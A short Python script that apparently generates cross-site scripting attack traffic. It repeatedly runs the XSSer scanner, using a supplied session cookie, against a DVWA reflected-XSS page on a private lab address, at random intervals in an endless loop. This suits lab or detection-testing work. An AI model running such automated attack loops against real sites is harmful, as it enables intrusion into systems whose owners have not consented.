import os
import random
import sys
import time
import random

URL="http://192.168.0.121/vulnerabilities/xss_r/?name="
Cookie=""
def main(argc, argv):
	num=random.randint(0,5)
	Cookie=sys.argv[1]
	print(Cookie)
	start='python xsser.py -u '
	cmd0=start+"\""+URL+"\""+" --cookie=\""+Cookie+"; security=low"+"\""+" --auto -s -v --reverse-check --Hex"
	cmd1=start+"\""+URL+"\""+" --cookie=\""+Cookie+"; security=medium"+"\""+" --auto -s -v --reverse-check --Hex"
	cmd2=start+"\""+URL+"\""+" --cookie=\""+Cookie+"; security=high"+"\""+" --auto -s -v --reverse-check --Hex"
	cmd3=start+"\""+URL+"\""+" --cookie=\""+Cookie+"; security=low"+"\""+" --auto -s -v --reverse-check"
	cmd4=start+"\""+URL+"\""+" --cookie=\""+Cookie+"; security=medium"+"\""+" --auto -s -v --reverse-check"	
	cmd5=start+"\""+URL+"\""+" --cookie=\""+Cookie+"; security=hard"+"\""+" --auto -s -v --reverse-check"
	cmd=[cmd0,cmd1,cmd2,cmd3,cmd4,cmd5]
	while True:
		sleep_time=random.randint(20,40)
		time.sleep(sleep_time)
		os.system(cmd[num])	
		print("flag")
		print(cmd[num])

if __name__=="__main__":
	main(len(sys.argv),sys.argv)